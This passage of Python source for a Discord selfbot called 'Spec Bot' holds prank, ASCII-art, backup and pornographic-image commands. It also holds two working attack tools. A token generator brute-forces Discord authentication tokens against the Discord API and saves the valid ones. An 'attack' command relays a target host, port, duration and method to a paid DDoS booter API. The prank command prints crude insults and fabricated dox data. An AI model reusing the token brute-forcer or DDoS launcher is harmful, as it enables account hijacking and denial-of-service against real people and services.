    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


@Reluctant.command()
async def penis(ctx):
    list = (
        ":ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8===:punch: \n             :trumpet:      :eggplant:                 ",
        ":ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:                 ",
        ":ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant:                 ",
        ":ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D :sweat_drops:\n             :trumpet:      :eggplant:                 ",
        ":ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8===:punch: :sweat_drops:\n             :trumpet:      :eggplant:                 :sweat_drops:",
    )
    for i in list:
        await asyncio.sleep(1.0)
        await ctx.message.edit(content=i)


# Animated Commands End

# Art Commands Start


@Reluctant.command()
async def ghost(ctx):
    await ctx.message.delete()
    await ctx.send("▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\n▒▒█▒▒▒▄██████████▄▒▒▒▒\n▒█▐▒▒▒████████████▒▒▒▒\n▒▌▐▒▒██▄▀██████▀▄██▒▒▒\n▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\n▐┼▐▒▒██████████████▒▒▒\n▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\n▒▒█████──────────▐███▌\n▒▒█▀▀██▄█─▄───▐─▄███▀▒\n▒▒█▒▒███████▄██████▒▒▒\n▒▒▒▒▒██████████████▒▒▒\n▒▒▒▒▒█████████▐▌██▌▒▒▒\n▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\n▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒")


@Reluctant.command()
async def tree(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░░░▌░░░░░░░▐\n░░░░█░░▄▌░░░░▌░░░█░░░▄▄\n░░░░▐▄░▌░░░░▐▄▌░░░▀▄█▄\n░░░░░▐█░░░░░░░▌░▄█▀░░░▀█\n░░░▌░░▐░░░░░▄▀▀▀░░░░░░░░\n░░░▐░░░▀▄░█▀▄▄▄▄░░░░░░░░\n▌░░█▄░░░▐▄█░░░░▌▀▄░░░░░░\n█░░░▐░░░██░░░░░█░░▄░█▀░░\n▐░░░█░░░▐█░░░░░░░░▌▀░░░░\n░▌░░▌░░░▐█▄░░░░▄▄█▄▄▄░░░\n▄▄▀▄█░░░░██░▄█▀░█▄▄░▐▄▄░\n░░░░▀█▄░▄███░░░░░░░░░░░░\n░░░░░░█████░░░░░░░░░░░░░\n░░░░░░░▐███░░░░░░░░░░░░░\n░░░░░░░▐███░░░░░░░░░░░░░\n░░░░░░░▐████░░░░░░░░░░░░\n░░▒▒▒▒▒█████▒▒░░░░░░░░░░\n▒▒▒▒▒▒▄██████▒▒▒▒▒▒▒▒▒▒▒\n▒▒▄▄▄█▀▒█▀▐▀▀██▄▄▄▒▒▒▒▒▒\n█▀▐▒█▒▒▒▌▒▒▐▒▒▒▒▒▌▀▀▄▒▒▒")


@Reluctant.command()
async def shit(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░░░░░░█▀▀░░█░░░░░░\n░░░░░░▄▀▀▀▀░░░░░█▄▄░░░░\n░░░░░░█░█░░░░░░░░░░▐░░░\n░░░░░░▐▐░░░░░░░░░▄░▐░░░\n░░░░░░█░░░░░░░░▄▀▀░▐░░░\n░░░░▄▀░░░░░░░░▐░▄▄▀░░░░\n░░▄▀░░░▐░░░░░█▄▀░▐░░░░░\n░░█░░░▐░░░░░░░░▄░█░░░░░\n░░░█▄░░▀▄░░░░▄▀▐░█░░░░░\n░░░█▐▀▀▀░▀▀▀▀░░▐░█░░░░░\n░░▐█▐▄░░▀░░░░░░▐░█▄▄░░░\n░░░▀▀▄░░░░░░░░▄▐▄▄▄▀░░░\n░░░░░░░░░░░░░░░░░░░░░░░")


@Reluctant.command()
async def spider(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░░░░░░║\n░░▄█▀▄░░░░░║░░░░░░▄▀▄▄\n░░░░░░▀▄░░░║░░░░▄▀\n░▄▄▄░░░░█▄▄▄▄▄▄█░░░░▄▄▄\n▀░░░▀█░█▀░░▐▌░░▀█░█▀░░░▀\n░░░░░░██░░▀▐▌▀░░██\n░▄█▀▀▀████████████▀▀▀█\n█░░░░░░██████████░░░░░▀▄\n█▄░░░█▀░░▀▀▀▀▀▀░░▀█░░░▄█\n░▀█░░░█░░░░░░░░░░█░░░█▀")


@Reluctant.command()
async def island(ctx):
    await ctx.message.delete()
    await ctx.send("──────────────────────────────────\n─────────▄▄───────────────────▄▄──\n──────────▀█───────────────────▀█─\n──────────▄█───────────────────▄█─\n──█████████▀───────────█████████▀─\n───▄██████▄─────────────▄██████▄──\n─▄██▀────▀██▄─────────▄██▀────▀██▄\n─██────────██─────────██────────██\n─██───██───██─────────██───██───██\n─██────────██─────────██────────██\n──██▄────▄██───────────██▄────▄██─\n───▀██████▀─────────────▀██████▀──\n──────────────────────────────────\n──────────────────────────────────\n──────────────────────────────────\n───────────█████████████──────────\n──────────────────────────────────\n──────────────────────────────────")


@Reluctant.command()
async def castle(ctx):
    await ctx.message.delete()
    await ctx.send("─────────█▄██▄█\n█▄█▄█▄█▄█▐█┼██▌█▄█▄█▄█▄█\n███┼█████▐████▌█████┼███\n█████████▐████▌█████████")


@Reluctant.command()
async def truck(ctx):
    await ctx.message.delete()
    await ctx.send("──────▄▌▐▀▀▀▀▀▀▀▀▀▀▀▀▌\n───▄▄██▌█░░░░░░░░░░░░▐\n▄▄▄▌▐██▌█░░░░░░░░░░░░▐\n▀❍▀▀▀▀▀▀▀❍❍▀▀▀▀▀▀❍❍▀")


@Reluctant.command()
async def glasses(ctx):
    await ctx.message.delete()
    await ctx.send("█──██████────██████──█\n█─██────██──██────██─█\n─███─██─██████─██─███\n──██────██──██────██\n───██████────██████")


@Reluctant.command()
async def doggo(ctx):
    await ctx.message.delete()
    await ctx.send("╥━━━━━━━━╭━━╮━━┳\n╢╭╮╭━━━━━┫┃▋▋━▅┣\n╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣\n╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣\n╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣\n╨━━┗┛┗┛━━┗┛┗┛━━┻")


@Reluctant.command()
async def phone(ctx):
    await ctx.message.delete()
    await ctx.send("──▄▄██████▄▄\n▄██▀▄█▄▄█▄▀██▄\n▀▀▀▄██▀▀██▄▀▀▀\n─▄███─██─███▄\n─█████▄▄█████")


@Reluctant.command()
async def guitar(ctx):
    await ctx.message.delete()
    await ctx.send("░▄▀▀▀▀▄░░▄▄\n█░░░░░░▀▀░░█░░░░░░▄░▄\n█░║░░░░██░████████████ \n█░░░░░░▄▄░░█░░░░░░▀░▀\n░▀▄▄▄▄▀░░▀▀")


@Reluctant.command()
async def pistol(ctx):
    await ctx.message.delete()
    await ctx.send("░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄☆\n░███████████████████████\n░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤\n╬▀░▐▓▓▓▓▓▓▌▀█░░░█▀░\n▒░░▓▓▓▓▓▓█▄▄▄▄▄█▀╬░\n░░█▓▓▓▓▓▌░▒▒▒▒▒▒▒▒▒\n░▐█▓▓▓▓▓░░▒▒▒▒▒▒▒▒▒\n░▐██████▌╬░▒▒▒▒▒▒▒▒")


@Reluctant.command()
async def tank(ctx):
    await ctx.message.delete()
    await ctx.send("░░░░░░███████ ]▄▄▄▄▄▄▄▄\n▂▄▅█████████▅▄▃▂\nI███████████████████].\n◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...")


@Reluctant.command()
async def up(ctx):
    await ctx.message.delete()
    await ctx.send("⁣          :balloon::balloon:  :cloud:\n         :balloon::balloon::balloon:\n :cloud:     :balloon::balloon::balloon::balloon:\n        :balloon::balloon::balloon::balloon:\n   :cloud:    ⁣:balloon::balloon::balloon:\n           |/\n           :house:   :cloud:\n   :cloud:         :cloud:\n         \n:deciduous_tree::rose::school::deciduous_tree::office::office:_:office::office::deciduous_tree::deciduous_tree:")


@Reluctant.command()
async def shower(ctx):
    await ctx.message.delete()
    await ctx.message.delete()
    await ctx.send("⁣     :shower:￣＼\n     :sweat:   ｜\n    ⁣/|💧 ｜\n| :droplet:/ \   |\n")


# Art Commands End

# Backup Commands Start


@Reluctant.command()
async def backupfriends(ctx):
    await ctx.message.delete()
    for friend in Reluctant.user.friends:
        friendlist = (friend.name) + '#' + (friend.discriminator)
        with open('Backups/friends.txt', 'a+') as f:
            f.write(friendlist + "\n")
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Friend {friend} To friends.txt")
    for block in Reluctant.user.blocked:
        blocklist = (block.name) + '#' + (block.discriminator)
        with open('Backups/blocked.txt', 'a+') as f:
            f.write(blocklist + "\n")
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Saved Blocked User {friend} To blocked.txt")


@Reluctant.command()
async def copyserver(ctx):
    await ctx.message.delete()
    await Reluctant.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Reluctant.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
                print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Channel: {c}")
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Voice Channel: {chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
                        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Text Channel: {chann}")
            for role in ctx.guild.roles:
                name = role.name
                color = role.colour
                perms = role.permissions
                await g.create_role(name=name, permissions=perms, colour=color)
                print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Role: {role}")
    print(f'{Fore.GREEN}[-] {Fore.WHITE}Server Successfully Copied' + Fore.WHITE)
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


# Backup Commands End

# NSFW Commands Start


@Reluctant.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Reluctant.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@Reluctant.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@Reluctant.command()
async def neko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@Reluctant.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@Reluctant.command()
async def cum(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@Reluctant.command()
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    em = discord.Embed(color = 0xff0000)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


# NSFW Commands End

# Generator Commands Start


def generator():
    chars = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
    current_path = os.path.dirname(os.path.realpath(__file__))
    for i in range (150):
        token1 = ""
        token2 = "ODU3MD."

        for c in range(52):
            token1 += random.choice(chars)

        token1 = str(token1)
        token2 = str(token2)

        tokendone = token2 + token1
        r = post(f'https://discord.com/api/v6/invite/{random.randint(1, 9999999)}', headers={'Authorization': tokendone})
        if "You need to verify your account in order to perform this action." in str(r.content) or "401: Unauthorized" in str(r.content):
            print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Token: {tokendone} | Response: {r.content}")
        else:
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Working Token: {tokendone}")
            f = open(current_path + "/" + "Other/generatedtokens.txt", "a")
            f.write(tokendone + "\n")
    Clear()
    startprint()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Finished! All Valid Tokens Will Save To /Other/valid_tokens.txt")


@Reluctant.command()
async def gentokens(ctx):
    await ctx.message.delete()
    threading.Thread(target=generator).start()


# Generator Commands End

# DDoS Commands Start


@Reluctant.command()
async def attack(ctx, host: str = None, port: str = None, time: str = None, method: str = None):
    await ctx.message.delete()
    if api_url == "":
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Invalid API Url```", value="Change this in config.json", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid API Url. Change this in config.json")
        return
    if api_key == "":
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Invalid Key```", value="Change this in config.json", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Key. Change this in config.json")
        return
    if host is None:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```{host}```", value="Invalid Host", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Host")
        return
    if port is None:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```{port}```", value="Invalid Port", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "cosnole":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Port")
        return
    if time is None:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```{time}```", value="Invalid Time", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Time")
        return
    if method is None:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```{method}```", value="Invalid Method", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Method")
        return
    if method in config['methods']:
        pass
    else:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```{method}```", value="Invalid Method", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {methods} - Invalid Method")
        return
    if any(c.isalpha() for c in host):
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```{host}```", value="Invalid Host", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Invalid Host")
        return
    else:
        try:
            response = requests.get(f"{api_url}?key={api_key}&host={host}&port={port}&time={time}&method={method}")
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/879848005891657828/886679563973845072/checkl.gif")
            embed.add_field(name=f"```Attack Successfully Sent```", value=f"Status: {response.status_code}", inline=False)
            embed.add_field(name=f"```Host```", value=f"{host}", inline=False)
            embed.add_field(name=f"```Port```", value=f"{port}", inline=False)
            embed.add_field(name=f"```Time```", value=f"{time}", inline=False)
            embed.add_field(name=f"```Method```", value=f"{method}", inline=False)
            embed.add_field(name=f"```{prefix}attack {host} {port} {time} {method}```", value=f"Syntax", inline=False)
            embed.set_footer(text="Success ")
            await ctx.send(embed=embed)
            return
        except Exception as e:
            if error_style == "embeds":
                embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
        
                embed.add_field(name=f"```Unknown Error```", value=f"Status: {response.status_code}", inline=False)
                embed.set_footer(text="Error ")
                await ctx.send(embed=embed)
            elif error_style == "console":
                print(f"{Fore.RED}[-] {Fore.WHITE}Unknown Error. Status: {response.status_code}")
            return


@Reluctant.command()
async def methods(ctx):
    count = 0
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
    for method in config['methods']:
        count = count + 1
        embed.add_field(name=f"```{method}```", value=f"Method #{count}", inline=False)
    embed.set_footer(text="Methods ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def status(ctx):
    await ctx.message.delete()
    if api_key == "":
        keystatus = "Not Loaded"
    else:
        keystatus = "Successfully Loaded"
    if api_url == "":
        urlstatus = "Not Loaded"
    else:
        urlstatus = "Successfully Loaded"
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
    embed.add_field(name=f"```Url```", value=f"{urlstatus}", inline=False)
    embed.add_field(name=f"```Key```", value=f"{keystatus}", inline=False)
    embed.add_field(name=f"```Max Time```", value=f"{max_time} Seconds", inline=False)
    embed.set_footer(text="Status ")
    await ctx.send(embed=embed)


# DDoS Commands End

# Setting Commands Start


@Reluctant.command()
async def settings(ctx):
    await ctx.message.delete();
    if error_style == "embeds":
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")

        embed.add_field(name=f"```Username```", value=f"{Reluctant.user.name}", inline=False)
        embed.add_field(name=f"```Selfbot Version```", value=f"v2.0", inline=False)
        embed.add_field(name=f"```Error Style```", value=f"Embeds", inline=False)
        embed.set_footer(text="Settings ")
        await ctx.send(embed=embed)
        return
    elif error_style == "console":
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")

        embed.add_field(name=f"```Username```", value=f"{Reluctant.user.name}", inline=False)
        embed.add_field(name=f"```Selfbot Version```", value=f"v2.0", inline=False)
        embed.add_field(name=f"```Error Style```", value=f"Console", inline=False)
        embed.set_footer(text="Settings ")
        await ctx.send(embed=embed)
        return


# Setting Commands Start


@Reluctant.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx):
    await ctx.message.delete()
    Clear()
    startprint()


if __name__ == '__main__':
    Init()
